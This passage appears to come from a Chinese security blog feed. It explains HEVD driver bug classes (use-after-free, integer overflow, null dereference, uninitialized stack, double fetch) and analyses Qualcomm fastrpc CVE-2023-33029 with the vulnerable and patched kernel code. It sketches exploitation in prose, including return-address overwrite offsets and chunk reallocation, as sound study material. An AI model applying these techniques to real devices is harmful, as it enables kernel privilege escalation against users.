) 函数分配内存大小为0x58 给v0 局部变量，并且后续这块分配v0 内存块做了以下的操作：<br>        1. 将 v0+1 后的0x54 个内存都赋值为”A“<br>        2. 将内存的最后一个字节设置为0<br>        3. 并且将内存的前四个字节设置为 UAFObjectCallbackNonPagedPool  函数的地址。<br>        4. 将v0内存的地址赋值给g_UseAfterFreeObjectNonPagedPool<br><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240717225548896.png"><br>仔细看一下g_UseAfterFreeObjectNonPagedPool，这是一个在.data 段的全局变量<br><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240717225330947.png"></p><p><strong>释放之前给指针分配的内存</strong></p><p>这里会调用这个 ExFreePoolWithTag() 函数来释放内存，这里释放的是这个全局变量g_UseAfterFreeObjectNonPagedPool的指针，前面在分析指针指向内存分配的时候，了解到g_UseAfterFreeObjectNonPagedPool 这个全局变量指向的内存就是分配的内存。</p><p>并且在释放之前会判断 g_UseAfterFreeObjectNonPagedPool 是否为0<br><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240717230452891.png"></p><p>这里值得注意的是 g_UseAfterFreeObjectNonPagedPool 这个全局变量在释放后，并没有被完全置空，所以 g_UseAfterFreeObjectNonPagedPool 全局变量的指针仍然指向 0x58 内存块起始地址，只是内存块内的数据已经被释放了。</p><p>所以如果有人能调用 g_UseAfterFreeObjectNonPagedPool 指针，则将造成UAF 漏洞。</p><p><strong>调用 g_UseAfterFreeObjectNonPagedPool 指针</strong><br>在 UseUaFObjectNonPagedPool() 函数中，可以看到会调用UseUaFObjectNonPagedPool 指针。</p><p>在前面分配内存，并且给内存赋值的过程中，UseUaFObjectNonPagedPool 指向的内存0x58内存中，前四个字节保存的是 UAFObjectCallbackNonPagedPool 函数的地址。</p><p>因此最终调用的是 UAFObjectCallbackNonPagedPool 这个函数。如果 0x58内存块中的数据被释放后，UAFObjectCallbackNonPagedPool 函数的地址就不复存在，所以通过调用UseUaFObjectNonPagedPool 指针来访问内存就会出现内存错误，因为内存已经被释放了。<br><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240717231324492.png"></p><p><strong>AllocateFakeObjectNonPagedPool 函数</strong></p><p>为了能够更好的利用这个漏洞，还存在 AllocateFakeObjectNonPagedPool 函数，这个函数就是重新分配一个0x58大小的内存。由于内存管理中在内存分配的时候，上一块已经被释放的0x58大小的内存没人用，这次分配一样大小的内存，就会覆盖上去，这样的话 g_UseAfterFreeObjectNonPagedPool 全局变量指向的内存区域就是这一次分配同样大小的内存区域。那么就可以控制程序的执行流程，调用shellcode。<br><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240717233134980.png"></p><p>总结一下： 其实这个漏洞的模式还是很理想的，在真实的UAF 漏洞环境中，是不会有 AllocateFakeObjectNonPagedPool 这样的函数。其实最好的利用方式就是直接AllocateUaFObjectNonPagedPool 分配内存的时候，就将shellcode地址放到内存的前四个字节，因为在调用g_UseAfterFreeObjectNonPagedPool 指针的时候，并没有校验指针指向的内存是否合法。<br>因此也存在任意地址访问的漏洞。</p><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>这个案例是整数溢出的案例，有关整数溢出相关原理不详细展开说：<br>    - 1. 有符号整数可以溢出。<br>    - 2. 无符号的整数存在回绕的问题，常用于绕过判断语句<br>    - 3. 有符号整数在某些情况下会强转成无符号整数，就会出现溢出。比如memcpy，strncpy</p><p>函数 TriggerIntegerOverflow 中存在整数溢出漏洞<br>    1.  定义一个局部变量分配的大小是 512* 4 字节 &#x3D; 2048<br>    2.  将userbuffer 用户传入内存地址赋值给 局部变量 v3， 其中的size 是userbuffer 的大小。<br>    3. 这里会判断用户传入的size 的大小，首先是size +4 &lt;&#x3D;2048，说明size 的值要小于2044， 因为userbuffer 的最后四个字节是0x0BAD0B0B0，是用户终止userbuffer 拷贝到kernelbuffer 的符号；这里如果Size的值是一个很大的值，在 size +4 后，就会发生整数回绕的问题，进而小于2048，绕过这个判断。<br>    4.  这里会将userBuffer 逐个字节的拷贝到 KernelBuffer，如果前面的Size+4 &lt;&#x3D;2048 被绕过了，那么如果userBuffer 的字节数量，超过了给KernelBuffer 分配的2048个字节内存，就会引发缓冲区溢出的问题。</p><p><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240719232843681.png"></p><p>这个案例的漏洞利用比较好理解，首先输入 0x820个字节覆盖kernelBuffer缓冲区，然后再传入4个字节覆盖栈底，然后覆盖 返回地址 ret 为 shellcode 的地址，这样以来，函数执行流程中会跳转到shellcode 执行。</p><h2 id="空指针解引用"><a href="#空指针解引用" class="headerlink" title="空指针解引用"></a>空指针解引用</h2><p>空指针引用（NULL POINT），程序在申请完内存并设置好指向内存的指针，再该内存被使用后，程序会对该内存进行释放，并且对指向该内存的指针进行清空（置空，设为NULL）, 如果之后还对这个指针进行使用，很有可能会出现问题。</p><p>TriggerNullPointerDereference 漏洞函数中，按照空指针解引用漏洞的触发条件来分析：<br>        1 . 给局部变量 v1 分配0x08 大小的内存区域， 并把内存地址赋值给指针 v1<br>        2.  将用户输入的 userBuffer 内存地址赋值给指针v3<br>        3.  判断 指针v3 指向内存区域的的前四个字节数据是否为 0xBAD0B0B0 ，然后进入到正常的代码流程中，给指针v1 指向的内存区域传入数据，具体操作是 前四个字节为0xBAD0B0B0，后四个字节为 NullPointerDereferenceObjectCallback 函数地址。<br>        4. 如果 [3] 中的判断错误，那就会释放之前给指针 v1分配的 0x08字节大小的内存区域，然后将指针 v1 设置成空指针。<br>        5. 接下来会执行v1[1]，也就是v1 后四个字节保存的函数地址，这里就存在漏洞，如果用户输入的userBuffer 数据中不包含 0xBAD0B0B0，那指针v1 指向的内存区域会被释放，并且指针v1 会被指向内存地址为0（置空），没有指向任何有效内存地址，因此调用 v1[1] 函数就会出现空指针解引用的漏洞。</p><p><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240721212832224.png"></p><p>在漏洞利用的时候，可以设置shellcode 的内存首地址是NULL，然后在后四个字节中放入shellcode 的地址，在最后执行的时候，会执行shellcode。</p><p>但是这只是在理想的情况下，大部分的空指针解引用的问题就是程序员在开的时候，在逻辑错综复杂的代码中，没有在指针调用的时候，没有对指针是否为空进行判断。如果恰好有个地方可以释放指针指向的内存空间并且将指针置空，但在离置空指针较远的地方存在没对指针进行校验就引用指针中的数据，由于指针已经置空了，因此指向的内存区域是无效的，所以程序会产生拒绝服务的现象。</p><h2 id="未初始化栈变量"><a href="#未初始化栈变量" class="headerlink" title="未初始化栈变量"></a>未初始化栈变量</h2><p>未初始化栈变量 指的是在函数中，局部变量没有被初始化。 <a href="https://cwe.mitre.org/data/definitions/457.html">https://cwe.mitre.org/data/definitions/457.html</a></p><p>由于局部变量未初始化，因为在函数调用的时候，函数的栈空间分配时，可能会给这个局部变量分配一些意想不到的数据，因此如果当有程序调用这个局部变量的时候，就会从栈上获取这个数据，从而造成内存损坏的问题。比如拒绝服务，崩溃等危害。</p><p>在TriggerUninitializedMemoryStack函数中：<br>        1. UninitializedMemory 变量在整个函数中被定义。<br>        2. 传入userBuffer<br>        3. 判断userBuffer 前四个字节是否是 0xBAD0B0B0， 如果是的话，就初始化 UninitializedMemory 局部变量。<br>        4. 就算没有初始化UninitializedMemory局部变量，最终还是会调用 UninitializedMemory.callback() 回调函数，这里就出现了问题，如果没有对UninitializedMemory局部变量进行初始化，就直接从UninitializedMemory.callback 指针指向的内存区域中获取函数地址，并调用该函数，由于没有初始化，所以指针指向的内存地址是未知的，所以一切行为就不可控，进而产生漏洞。</p><p><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240721225725483.png"></p><p>这里在 <a href="https://bbs.kanxue.com/thread-270204.htm">https://bbs.kanxue.com/thread-270204.htm</a> 中进行漏洞利用的时候，callBack 指针指向的内存地址是无法预测的，因此使用了栈喷射技术</p><h2 id="DoubleFetch"><a href="#DoubleFetch" class="headerlink" title="DoubleFetch"></a>DoubleFetch</h2><p>参考：<br><a href="https://research.nccgroup.com/wp-content/uploads/2022/03/NCC_Group_Whitepaper_DoubleFetch2022_Report_2022-03-25_v1.0.pdf">https://research.nccgroup.com/wp-content/uploads/2022/03/NCC_Group_Whitepaper_DoubleFetch2022_Report_2022-03-25_v1.0.pdf</a></p><p>CTF wiki 的说法： <a href="https://ctf-wiki.org/en/pwn/linux/kernel-mode/exploitation/race/double-fetch/">https://ctf-wiki.org/en/pwn/linux/kernel-mode/exploitation/race/double-fetch/</a><br>这里对Double Fetch 的讲述很明确，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核最终有两次被取用，内核第一次取用数据进行安全检查（比如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。<br><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240722225042378.png"></p><p>结合代码来看，要明确这几个信息：<br>        1. 首先确定从用户空间输入的信息，也就是userDoubleFetch 结构体中成员变量指向用户缓冲区的内存地址。<br>        2. 找到第一次fetch 的地方，也就是检查大小的地方，但这里检查的是userDoubleFetch-&gt;size 的大小，这个值是用户空间的值，可以在使用之前，检查之后进行修改，比如检查的时候使用0x100，在检查之后，立马在竞态线程中，修改为0x900。<br>        3. 第二次fetch 在memcpy，也就是使用userDoubleFetch-&gt;size 值得地方，如果这里在通过检查之后，更改为了0x900,会造成缓冲区溢出的问题。</p><p>漏洞利用的话，只需要将shellcode 覆盖到返回地址就行了，kernBuffer离ebp栈底的距离是0x81C(2076个字节)，那么ebp栈底的位置在2076+4，覆盖到返回地址需要 2076+4+4，也就是2084个字节。<br><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240722231138336.png"></p><p>安全修复的代码，根据修复代码修复的逻辑可以进行如下的理解：<br>        1. 首先将 UserDoubleFetch-&gt;Size 的值赋值给局部变量 userBuffersize，因此 userBuffersize 在当前线程函数中是不会被改变的。<br>        2. 然后判断局部变量userBuffersize的大小是否超过内核缓冲区kernelBuffer，<br>        3. 其实这么做的话，我们知道doublefecth 是在第一次fetch 之后，通过多线程的竞态条件下更改用户缓冲区大小也就是UserDoubleFetch-&gt;Size 的值，会造成memcpy 的缓冲区溢出，但是这里由于 userBufferSize 是局部变量，因此在第一次fetch检查大小，和第二次fetch 使用之间的时间差内不会被更改，从而避免了doublefetch。<br><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240722232309943.png"></p><p>参考： <a href="https://www.freebuf.com/vuls/341170.html">https://www.freebuf.com/vuls/341170.html</a><br>           <a href="https://yuvaly0.github.io/2020/09/15/hevd-writeups">https://yuvaly0.github.io/2020/09/15/hevd-writeups</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Qualcomm Securitybulletin CVE-2023-33029 漏洞分析</title>
    <link href="/2024/05/26/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2024/05/26/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h2><p>description : Memory corruption in DSP Service during a remote call from HLOS to DSP.</p><p>根据漏洞描述来看，内存损坏是在 DSP 服务中发生的，具体的触发过程是 HLOS（主机操作系统）向DSP 发送请求并等待相应的过程中。</p><p>什么是DSP ?<br>全称是 Digital Signal Processor , DSP 是一种专门设计来处理数字信号的微处理器。一般在信号处理领域，如图像处理、语音识别等。</p><p>什么是HLOS?<br><strong>HLOS (Host Operating System)</strong>: 这通常指的是运行在设备主处理器上的操作系统，它负责管理和控制设备的硬件资源，并提供用户界面和服务。</p><p>代码库路径：<br><a href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/commit/d4b9e0d3bfcb5213e23f5642cb8dcc1433542303#7b5ee30919fc6e80fe7597966e29bdc13d262367">https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/commit/d4b9e0d3bfcb5213e23f5642cb8dcc1433542303#7b5ee30919fc6e80fe7597966e29bdc13d262367</a><br><img src="/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240520175119093.png"><br>根据其修复的日志信息，可以分析出：</p><ol><li><strong>Thread T1 add buffer to fl-&gt;cached_bufs and release fl-&gt;hlock and holding buffer reference.</strong><ul><li>线程T1将一个缓冲区（buffer）添加到<code>fl-&gt;cached_bufs</code>（可能是一个缓存缓冲区列表）中，然后释放<code>fl-&gt;hlock</code>（可能是一个互斥锁），同时保持对缓冲区的引用。</li></ul></li><li><strong>Now thread T2 will acquire fl-&gt;hlock and free buffer in fastrpc_cached_buf_list_free().</strong><ul><li>现在，线程T2将获取<code>fl-&gt;hlock</code>，然后在<code>fastrpc_cached_buf_list_free()</code>函数中释放缓冲区。</li></ul></li><li><strong>T1 will dereference the freed buffer.</strong><ul><li>线程T1将对已释放的缓冲区进行解引用（dereference）。</li></ul></li><li><strong>Moving reference buffer uses for T1 inside fl-&gt;hlock to avoid UAF.</strong><ul><li>为了避免使用后释放（UAF，Use After Free）的错误，建议在<code>fl-&gt;hlock</code>内部为T1移动引用缓冲区。</li></ul></li></ol><h2 id="0x02-漏洞相关函数"><a href="#0x02-漏洞相关函数" class="headerlink" title="0x02 漏洞相关函数"></a>0x02 漏洞相关函数</h2><p>存在漏洞的函数fastrpc_buf_free</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void fastrpc_buf_free(struct fastrpc_buf *buf, int cache)<br>&#123;<br><span class="hljs-function"><span class="hljs-title">struct</span> fastrpc_file *fl = buf == NULL ? NULL : buf-&gt;</span>fl;<br>int vmid, err = <span class="hljs-number">0</span>, cid = -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (!fl)<br>return;<br><span class="hljs-function"><span class="hljs-title">if</span> (buf-&gt;</span>in_use) &#123;<br><span class="hljs-comment">/* Don&#x27;t free persistent header buf. Just mark as available */</span><br><span class="hljs-function"><span class="hljs-title">spin_lock</span>(&amp;fl-&gt;</span>hlock);<br><span class="hljs-function"><span class="hljs-title">buf</span>-&gt;</span>in_use = <span class="hljs-literal">false</span>;<br><span class="hljs-function"><span class="hljs-title">spin_unlock</span>(&amp;fl-&gt;</span>hlock);<br>return;<br>&#125;<br><span class="hljs-function"><span class="hljs-title">if</span> (cache &amp;&amp; buf-&gt;</span>size &lt; MAX_CACHE_BUF_SIZE) &#123;<br><span class="hljs-function"><span class="hljs-title">spin_lock</span>(&amp;fl-&gt;</span>hlock);<br><span class="hljs-function"><span class="hljs-title">if</span> (fl-&gt;</span>num_cached_buf &gt; MAX_CACHED_BUFS) &#123;<br><span class="hljs-function"><span class="hljs-title">spin_unlock</span>(&amp;fl-&gt;</span>hlock);<br>goto skip_buf_cache;<br>&#125;<br><span class="hljs-function"><span class="hljs-title">hlist_add_head</span>(&amp;buf-&gt;</span><span class="hljs-function"><span class="hljs-title">hn</span>, &amp;fl-&gt;</span>cached_bufs);<br><span class="hljs-function"><span class="hljs-title">fl</span>-&gt;</span>num_cached_buf++;<br><span class="hljs-function"><span class="hljs-title">spin_unlock</span>(&amp;fl-&gt;</span>hlock); <span class="hljs-comment">// 漏洞修复前</span><br><span class="hljs-function"><span class="hljs-title">buf</span>-&gt;</span>type = -<span class="hljs-number">1</span>;<br><span class="hljs-function"><span class="hljs-title">spin_unlock</span>(&amp;fl-&gt;</span>hlock);  <span class="hljs-comment">// 漏洞修复后</span><br>return;<br>&#125;<br>skip_buf_cache:<br><span class="hljs-function"><span class="hljs-title">if</span> (buf-&gt;</span>type == USERHEAP_BUF) &#123;<br><span class="hljs-function"><span class="hljs-title">spin_lock</span>(&amp;fl-&gt;</span>hlock);<br><span class="hljs-function"><span class="hljs-title">hlist_del_init</span>(&amp;buf-&gt;</span>hn_rem);<br><span class="hljs-function"><span class="hljs-title">spin_unlock</span>(&amp;fl-&gt;</span>hlock);<br><span class="hljs-function"><span class="hljs-title">buf</span>-&gt;</span>raddr = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-title">if</span> (!IS_ERR_OR_NULL(buf-&gt;</span>virt)) &#123;<br>int destVM[<span class="hljs-number">1</span>] = &#123;VMID_HLOS&#125;;<br>int destVMperm[<span class="hljs-number">1</span>] = &#123;PERM_READ | PERM_WRITE | PERM_EXEC&#125;;<br>VERIFY(<span class="hljs-function"><span class="hljs-title">err</span>, fl-&gt;</span>sctx != NULL);<br><span class="hljs-keyword">if</span> (err)<br>goto bail;<br><span class="hljs-function"><span class="hljs-title">if</span> (fl-&gt;</span><span class="hljs-function"><span class="hljs-title">sctx</span>-&gt;</span>smmu.cb)<br><span class="hljs-function"><span class="hljs-title">buf</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">phys</span> &amp;= ~((uint64_t)fl-&gt;</span><span class="hljs-function"><span class="hljs-title">sctx</span>-&gt;</span>smmu.cb <span class="hljs-string">&lt;&lt; 32);</span><br><span class="hljs-string">cid = fl-&gt;cid;</span><br><span class="hljs-string">VERIFY(err, VALID_FASTRPC_CID(cid));</span><br><span class="hljs-string">if (err) &#123;</span><br><span class="hljs-string">err = -ECHRNG;</span><br><span class="hljs-string">ADSPRPC_ERR(</span><br><span class="hljs-string">&quot;invalid channel 0x%zx set for session\n&quot;,</span><br><span class="hljs-string">cid);</span><br><span class="hljs-string">goto bail;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">vmid = fl-&gt;apps-&gt;channel[cid].vmid;</span><br><span class="hljs-string">if (vmid) &#123;</span><br><span class="hljs-string">int srcVM[2] = &#123;VMID_HLOS, vmid&#125;;</span><br><span class="hljs-string">int hyp_err = 0;</span><br><span class="hljs-string">hyp_err = hyp_assign_phys(buf-&gt;phys,</span><br><span class="hljs-string">buf_page_size(buf-&gt;size),</span><br><span class="hljs-string">srcVM, 2, destVM, destVMperm, 1);</span><br><span class="hljs-string">if (hyp_err) &#123;</span><br><span class="hljs-string">ADSPRPC_ERR(</span><br><span class="hljs-string">&quot;rh hyp unassign failed with %d for phys 0x%llx, size %zu\n&quot;,</span><br><span class="hljs-string">hyp_err, buf-&gt;phys, buf-&gt;size);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">trace_fastrpc_dma_free(cid, buf-&gt;phys, buf-&gt;size);</span><br><span class="hljs-string">dma_free_attrs(fl-&gt;sctx-&gt;smmu.dev, buf-&gt;size, buf-&gt;virt,</span><br><span class="hljs-string">buf-&gt;phys, buf-&gt;dma_attr);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">bail:</span><br><span class="hljs-string">kfree(buf);</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>线程二要执行的函数 fastrpc_cached_buf_list_free </p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">static</span> void <span class="hljs-title function_ invoke__">fastrpc_cached_buf_list_free</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">fastrpc_file</span> *fl)<br>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">fastrpc_buf</span> *buf, *free;<br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_node</span> *n;<br>free = NULL;<br><span class="hljs-title function_ invoke__">spin_lock</span>(&amp;fl<span class="hljs-punctuation">-&gt;</span>hlock);<br><span class="hljs-title function_ invoke__">hlist_for_each_entry_safe</span>(buf, n, &amp;fl<span class="hljs-punctuation">-&gt;</span>cached_bufs, hn) &#123;<br><span class="hljs-title function_ invoke__">hlist_del_init</span>(&amp;buf<span class="hljs-punctuation">-&gt;</span>hn);<br>fl<span class="hljs-punctuation">-&gt;</span>num_cached_buf--;<br>free = buf;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">spin_unlock</span>(&amp;fl<span class="hljs-punctuation">-&gt;</span>hlock);<br><span class="hljs-keyword">if</span> (free)<br><span class="hljs-title function_ invoke__">fastrpc_buf_free</span>(free, <span class="hljs-number">0</span>);<br>&#125; <span class="hljs-keyword">while</span> (free);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据漏洞修复的情况来看，唯一的不同的是 buf-&gt;type 在修复后，移到了锁的保护中。<br>    如果按照修复前的代码中，当前线程释放锁后，此时如果有其他的线程介入，可能会在当前线程设置buf-&gt;type 为 -1 之前，就将 buf 结构体进行释放，收回该结构体的内存区域，接着当前结构体会对 buf-&gt;type 解引用，从而造成 UAF  漏洞。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">hlist_add_head</span>(&amp;buf-&gt;</span><span class="hljs-function"><span class="hljs-title">hn</span>, &amp;fl-&gt;</span>cached_bufs);<br><span class="hljs-function"><span class="hljs-title">fl</span>-&gt;</span>num_cached_buf++;<br><span class="hljs-function"><span class="hljs-title">spin_unlock</span>(&amp;fl-&gt;</span>hlock); <span class="hljs-comment">// 漏洞修复前</span><br><span class="hljs-function"><span class="hljs-title">buf</span>-&gt;</span>type = -<span class="hljs-number">1</span>;<br><span class="hljs-function"><span class="hljs-title">spin_unlock</span>(&amp;fl-&gt;</span>hlock);  <span class="hljs-comment">// 漏洞修复后</span><br>return;<br></code></pre></td></tr></table></figure><p>主要结构体</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">fastrpc_buf</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_node</span> hn;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_node</span> hn_rem;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_node</span> hn_init;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">fastrpc_file</span> *fl;<br><span class="hljs-type">void</span> *virt;<br><span class="hljs-type">uint64_t</span> phys;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> dma_attr;<br><span class="hljs-type">uintptr_t</span> raddr;<br><span class="hljs-type">uint32_t</span> flags;<br><span class="hljs-type">int</span> type;<span class="hljs-comment">/* One of &quot;fastrpc_buf_type&quot; */</span><br><span class="hljs-type">bool</span> in_use;<span class="hljs-comment">/* Used only for persistent header buffers */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">timespec64</span> buf_start_time;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">timespec64</span> buf_end_time;<br>&#125;;   <br></code></pre></td></tr></table></figure><p>驱动的函数操作符号</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span> fops = &#123;<br>.open = fastrpc_device_open,<br>.release = fastrpc_device_release,<br>.unlocked_ioctl = fastrpc_device_ioctl,<br>.compat_ioctl = compat_fastrpc_device_ioctl,<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>定位驱动名称</strong></p><p>DEVICE_NAME 的定义在 adsprpc_share.h 头文件内：<br><img src="/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240524145635322.png"></p><p><img src="/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240524150025044.png"><br><img src="/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240524150046705.png"></p><h2 id="0x03-代码路径分析"><a href="#0x03-代码路径分析" class="headerlink" title="0x03 代码路径分析"></a>0x03 代码路径分析</h2><p><strong>线程一</strong>  的执行路径：<br>根据fastrpc_buf_free 函数中要到达漏洞分支中，cache 参数不能0，在代码中只能看到如下调用<br>fastrpc_buf_free(ctx-&gt;buf, 1) —&gt;<br>context_free(struct smq_invoke_ctx *ctx)  —&gt;<br>fastrpc_context_list_dtor(struct fastrpc_file *fl)  —&gt;<br>fastrpc_file_free(struct fastrpc_file *fl)  —&gt;<br>fastrpc_device_release(struct inode *inode, struct file *file)  —&gt;</p><p><strong>线程二</strong>  的执行路径：<br>fastrpc_cached_buf_list_free 路径分析<br>fastrpc_cached_buf_list_free(struct fastrpc_file *fl)  —&gt;</p><p>fastrpc_cached_buf_list_free 函数有两处调用<br>调用一，在 fastrpc_buf_alloc 函数中，需要进入到调用处，需要经过 IS_ERR_OR_NULL 判断指针，所以不是走到这个分支。</p><blockquote><p><code>IS_ERR_OR_NULL</code>是Linux内核中一个常用的宏，用于检查一个指针是否表示一个错误或者为NULL<br>如果<code>ptr</code>是错误代码指针或NULL，这个宏返回true（非零值），否则返回false（零值）<br><img src="/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240521181403763.png"></p></blockquote><p>调用二，fastrpc_file_free 函数中，可以看到在这里会分别调用 fastrpc_context_list_dtor 函数和 fastrpc_cached_buf_list_free 函数。<br><img 